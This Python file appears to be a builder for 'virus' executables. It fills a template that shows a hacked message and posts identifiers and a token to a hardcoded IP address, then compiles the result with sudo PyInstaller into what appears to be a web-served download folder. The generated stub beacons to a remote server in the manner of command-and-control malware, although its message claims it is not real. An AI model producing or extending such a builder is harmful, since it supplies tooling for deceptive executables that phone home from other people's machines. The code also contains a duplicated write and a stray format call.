import subprocess
import argparse

# Boilerplate template with placeholders for parameters
template = """
import os
import requests

def display_message(user_id, virus_type):
    os.system('echo You have been hacked by user: {user_id} with virus: {virus_type}! (Not really) && pause'.format(user_id, virus_type))

def send_request(user_id, token, virus_type, name, heartbeat_rate):
    url = 'http://129.151.211.93/update'
    data = {{
        'user_id': '{user_id}',
        'token': '{token}',
        'virus_type': '{virus_type}',
        'name': '{name}',
        'heartbeat_rate': '{heartbeat_rate}',
    }}
    response = requests.post(url, json=data)

display_message(user_id='{user_id}', virus_type='{virus_type}')
send_request(user_id='{user_id}', token='{token}', virus_type='{virus_type}', name='{name}', heartbeat_rate='{heartbeat_rate}')
"""

def test():
    print("test")

def generateExe(source_file):
    # Call PyInstaller to compile the script to an exe
    try:
        subprocess.check_call(['sudo', 'python3', '-m', 'PyInstaller', '--onefile', '--debug=all', '--distpath', '/var/www/rubberduck/dist', source_file])
        return "Success"
    except subprocess.CalledProcessError as e:
        print(f"PyInstaller failed with error code: {e.returncode}")
        return "Failed to compile"

def generateScript(user_id, token, virus_type, name, heartbeat_rate):
    # Fill in the template with the provided parameters
    filled_template = template.format(
        user_id=user_id,
        token=token,
        virus_type=virus_type,
        name=name,
        heartbeat_rate=heartbeat_rate
    )

    # Write the filled-in template to a new Python script
    with open('generated_script.py', 'w') as f:
        f.write(filled_template)

    # Write the filled-in template to a new Python script (duplicate line)
    with open('generated_script.py', 'w') as f:
        f.write(filled_template)

# generateScript(1, '1234567890', 'Silent', 'TestVirus1', '1h')
# Wine compile test
# generateExe("generated_script.py")

# if __name__ == '__main__':
#     parser = argparse.ArgumentParser(description='Generate a Python script from parameters')
#     parser.add_argument('--user_id', required=True, type=int, help='User ID')
#     parser.add_argument('--token', required=True, help='Token')
#     parser.add_argument('--virus_type', required=True, help='Type of the virus')
#     parser.add_argument('--name', required=True, help='Name of the virus')
#     parser.add_argument('--heartbeat_rate', required=True, help='Heartbeat rate')

#     args = parser.parse_args()

#     generateScript(args.user_id, args.token, args.virus_type, args.name, args.heartbeat_rate)
